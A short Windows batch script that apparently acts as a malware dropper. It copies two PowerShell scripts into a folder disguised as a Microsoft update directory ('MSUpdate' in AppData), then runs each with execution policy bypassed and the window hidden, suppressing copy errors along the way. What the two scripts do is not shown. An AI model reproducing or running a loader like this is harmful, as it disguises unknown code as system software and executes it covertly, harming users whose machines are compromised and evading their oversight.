@echo off
set "WORKDIR=%USERPROFILE%\AppData\Local\Microsoft\MSUpdate"
if not exist "%WORKDIR%" mkdir "%WORKDIR%"
copy "%~dp0runnerr.ps1" "%WORKDIR%\runnerr.ps1" /Y >nul 2>&1
copy "%~dp0guardiann.ps1" "%WORKDIR%\guardiann.ps1" /Y >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\runnerr.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%WORKDIR%\guardiann.ps1"
exit
